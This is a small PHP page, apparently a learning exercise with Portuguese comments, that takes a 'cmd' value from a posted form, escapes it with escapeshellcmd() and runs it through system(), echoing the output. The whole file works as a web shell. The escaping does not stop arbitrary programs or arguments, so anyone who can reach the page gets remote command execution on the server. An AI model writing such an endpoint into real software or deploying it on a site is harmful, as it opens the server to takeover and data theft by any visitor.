<?php

if($_SERVER["REQUEST_METHOD"] === 'POST'){

    // recebe comando direto
    //$cmd = $_POST["cmd"];

    // escapando comando 
    $cmd = escapeshellcmd($_POST["cmd"]);

    var_dump($cmd);

    // manda o comando rodar no Terminal
    echo '<pre>';
    $comando = system($cmd,$retorno);
    echo '</pre>';

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

    <form method="post">

    <input type="text" name="cmd">
    <button type="submit">Enviar</button>

    </form>

</body>
</html>


